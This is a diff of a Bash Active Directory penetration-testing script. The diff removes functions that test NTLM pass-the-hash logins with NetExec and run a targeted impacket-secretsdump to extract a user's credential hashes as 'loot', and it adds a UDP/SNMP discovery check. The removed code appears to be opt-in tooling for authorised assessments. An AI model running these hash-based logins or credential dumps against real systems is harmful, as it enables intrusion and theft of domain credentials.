@@ -68,88 +68,6 @@ sps_run_optional_kerberos_auth_check() {
     return 0
 }
 
-sps_build_netexec_hash_args() {
-    local result_name="$1"
-    local user="$2"
-    local domain="$3"
-    local ntlm_hash="$4"
-    local -n result_ref="$result_name"
-
-    result_ref=(-u "$user" -H "$ntlm_hash" -d "$domain")
-}
-
-sps_run_netexec_hash_check() {
-    local protocol="$1"
-    local target="$2"
-    local client output display_command rc=0
-    local -a auth_args=()
-
-    if ! client="$(sps_netexec_command)"; then
-        warn "NTLM-hash check for $protocol skipped: NetExec is unavailable"
-        return 0
-    fi
-
-    sps_build_netexec_hash_args auth_args "$AUTH_USER" "$AUTH_DOMAIN" "$AUTH_NTLM_HASH"
-    display_command="$(sps_redact "$(sps_shell_join "$client" "$protocol" "$target" "${auth_args[@]}")")"
-    info "Testing $protocol authentication with the supplied NTLM hash"
-    echo -e "        ${GREEN}${display_command}${RESET}"
-    record_command "${protocol^^}" "NTLM-hash credential validation" "$display_command"
-
-    output=$(timeout 20 "$client" "$protocol" "$target" "${auth_args[@]}" 2>&1) || rc=$?
-    if grep -Eq "^${protocol^^}[[:space:]].*\[\+\]" <<< "$output"; then
-        success "${protocol^^} NTLM-hash authentication successful"
-        case "$protocol" in
-            ldap) LDAP_AUTH_BIND=true; LDAP_ACCESS_CONFIRMED=true ;;
-            mssql) MSSQL_AUTH_OK=true; MSSQL_INSTANCE_FOUND=true ;;
-            rdp) RDP_AUTH_OK=true; RDP_AUTH_STATUS="success"; RDP_AUTH_PROVIDER="netexec" ;;
-            winrm) WINRM_DETECTED=true; WINRM_AUTH_DETECTED=true ;;
-        esac
-        return 0
-    fi
-
-    warn "${protocol^^} NTLM-hash authentication failed or was not permitted (NetExec exit $rc)"
-    return 0
-}
-
-sps_run_secretsdump_hash_check() {
-    local tool="" hash_pair target_identity evidence_file display_command output rc=0
-    local candidate
-    local -a command_args=()
-
-    for candidate in impacket-secretsdump secretsdump.py; do
-        if command -v "$candidate" >/dev/null 2>&1; then
-            tool="$candidate"
-            break
-        fi
-    done
-    if [[ -z "$tool" ]]; then
-        warn "Secretsdump check skipped: impacket-secretsdump is unavailable"
-        return 0
-    fi
-
-    hash_pair=":${AUTH_NTLM_HASH}"
-    target_identity="${AUTH_DOMAIN}/${AUTH_USER}@${TARGET_IPV4}"
-    evidence_file="${EVIDENCE_DIR:-.}/secretsdump_$(sanitize_name "$SECRETSDUMP_TARGET_USER")_$(date +%Y%m%d_%H%M%S).txt"
-    command_args=(-hashes "$hash_pair" -just-dc-user "$SECRETSDUMP_TARGET_USER" "$target_identity")
-    display_command="$(sps_redact "$(sps_shell_join "$tool" "${command_args[@]}")")"
-
-    info "Running the opt-in secretsdump check for $SECRETSDUMP_TARGET_USER"
-    echo -e "        ${GREEN}${display_command}${RESET}"
-    record_command "SMB" "Targeted secretsdump validation" "$display_command"
-    output=$(timeout 90 "$tool" "${command_args[@]}" 2>&1) || rc=$?
-    printf '%s\n' "$output" > "$evidence_file"
-    chmod 600 "$evidence_file" 2>/dev/null || true
-
-    if grep -Eq ':[0-9]+:[[:xdigit:]]{32}:[[:xdigit:]]{32}:' <<< "$output"; then
-        critical "Secretsdump returned credential material for $SECRETSDUMP_TARGET_USER"
-        record_loot "secretsdump_hash" "$SECRETSDUMP_TARGET_USER" "$evidence_file"
-    else
-        warn "Secretsdump did not return a hash for $SECRETSDUMP_TARGET_USER (exit $rc)"
-        record_loot "secretsdump_output" "$SECRETSDUMP_TARGET_USER" "$evidence_file"
-    fi
-    return 0
-}
-
 sps_validate_runtime() {
     local command_name
     local -a missing=()
@@ -197,6 +115,7 @@ sps_run_optional_preflight() {
     }
 
     [[ "${ENABLE_SERVICE_DETECT:-false}" == true ]] && sps_optional_tool_check "service detection" nmap || true
+    [[ "${ENABLE_UDP_SCAN:-true}" == true ]] && sps_optional_tool_check "targeted UDP and SNMP discovery" nmap snmpget || true
     sps_optional_tool_check "NetBIOS discovery" nmblookup nbtscan || true
     if [[ "${ENABLE_WEB_ENUM:-false}" == true ]]; then
         sps_optional_tool_check "web enumeration" ffuf || true
@@ -215,17 +134,13 @@ sps_run_optional_preflight() {
     fi
     [[ "${ENABLE_BH_EXPORT:-false}" == true ]] && sps_optional_tool_check "BloodHound" bloodhound-ce-python bloodhound-python || true
     [[ "${ENABLE_ADCS:-false}" == true ]] && sps_optional_tool_check "AD CS" certipy-ad || true
-    [[ -n "${AUTH_NTLM_HASH:-}" ]] && sps_optional_tool_check "NTLM-hash authentication" netexec nxc || true
-    [[ "${ENABLE_SECRETSDUMP:-false}" == true ]] && sps_optional_tool_check "Targeted secretsdump" impacket-secretsdump secretsdump.py || true
     [[ "${ENABLE_MSSQL_ENUM:-false}" == true || "${ENABLE_MSSQL_BRUTE:-false}" == true ]] &&
         sps_optional_tool_check "MSSQL" netexec crackmapexec || true
 }
 
 sps_validate_selected_features() {
     local missing_creds=false
-    if [[ -z "${AUTH_USER:-}" ]] || [[ -z "${AUTH_PASS:-}" && -z "${AUTH_NTLM_HASH:-}" ]]; then
-        missing_creds=true
-    fi
+    [[ -z "${AUTH_USER:-}" || -z "${AUTH_PASS:-}" ]] && missing_creds=true
 
     if [[ "$missing_creds" == true ]]; then
         if [[ "${ENABLE_BH_EXPORT:-false}" == true || "${ENABLE_KERBROAST:-false}" == true || "${ENABLE_ADCS:-false}" == true ||
@@ -235,9 +150,9 @@ sps_validate_selected_features() {
         fi
     fi
 
-    if [[ -n "${AUTH_USER:-}" && -z "${AUTH_PASS:-}" && -z "${AUTH_NTLM_HASH:-}" ]]; then
+    if [[ -n "${AUTH_USER:-}" && -z "${AUTH_PASS:-}" ]]; then
         debug "Username supplied without a password; authenticated modules remain disabled"
-    elif [[ -z "${AUTH_USER:-}" ]] && [[ -n "${AUTH_PASS:-}" || -n "${AUTH_NTLM_HASH:-}" ]]; then
+    elif [[ -z "${AUTH_USER:-}" && -n "${AUTH_PASS:-}" ]]; then
         debug "Password supplied without a username; authenticated modules remain disabled"
     fi
 }
